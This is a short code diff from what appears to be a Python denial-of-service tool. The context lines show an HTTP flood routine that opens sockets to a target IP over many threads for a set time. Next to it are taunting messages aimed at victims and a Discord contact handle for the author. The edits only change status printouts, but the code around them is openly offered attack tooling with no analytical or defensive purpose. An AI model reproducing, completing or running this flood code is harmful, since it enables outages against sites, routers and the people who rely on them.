@@ -111,7 +111,7 @@ def system():
 							message = ["Hello, and I am sorry but, goodbye!", "Routers are such fragile things, aren't they?", "This message is dank af", "Discord: [SuperNova] Law#6800 <== Contact me if u want :3", "Humans are so bad with DDoS protection :)"]
 
 							print("Command Accepted!")
-							print("HTTP: Sent to %s with %s threads!" % (ip, numThreads))
+							print("HTTP: Sent to %s with %s threads of data for %s seconds!" % (ip, numThreads, timer))
 
 							def httpflood():
 								sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -128,7 +128,6 @@ def system():
 							for i in range(1, numThreads):
 								httpflood()
 								if time.time() > timeout:
-									print("done")
 									return
 						except:
 							pass
